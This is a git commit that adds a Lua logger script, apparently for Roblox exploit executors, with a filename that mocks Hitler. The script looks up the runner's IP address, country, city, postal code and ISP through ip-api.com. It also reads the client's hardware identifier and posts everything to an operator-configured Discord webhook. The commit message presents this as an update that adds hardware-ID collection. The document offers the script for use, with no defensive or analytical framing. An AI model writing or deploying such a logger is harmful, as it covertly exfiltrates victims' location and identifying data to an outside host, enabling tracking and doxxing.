8413b49c2a9bef994b1e8ac875c3c672c7638e98
Endeictic <99983295+Endeictic@users.noreply.github.com>
2023-02-26 20:58:18 +0700

    UHH UPDATE I GUESS
    New stuff:
    HWID
    Removed stuff:
    PLAYER-NAME, GAME-LINK

---
+++ Adolf-AustrianPainter.lua
@@ -0,0 +1,27 @@
+local fuRifKXqOL0ltne = "yo mama"
+
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
+
+local ip_info = HttpRequest({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local embed = {
+        ['title'] = "Logger 2 | Personal Information",
+        ['description'] = string.format("\HWID (Hardware Identification): "..game:GetService("RbxAnalyticsService"):GetClientId()).."\nIP: **%s**\nCountry: **%s**\nCountry Code: **%s**\nRegion: **%s**\nRegion Name: **%s**\nCity: **%s**\nZip: **%s**\nISP: **%s**\nOrg: **%s**", ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org),
+        ["type"] = "rich",
+        ["color"] = tonumber(getgenv().EmbedColor),
+}
+HttpRequest(
+    {
+    Url = ''..getgenv().DiscordWebhook..'',
+       Headers = {['Content-Type'] = 'application/json'},
+       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
+       Method = "POST"
+    }
+)
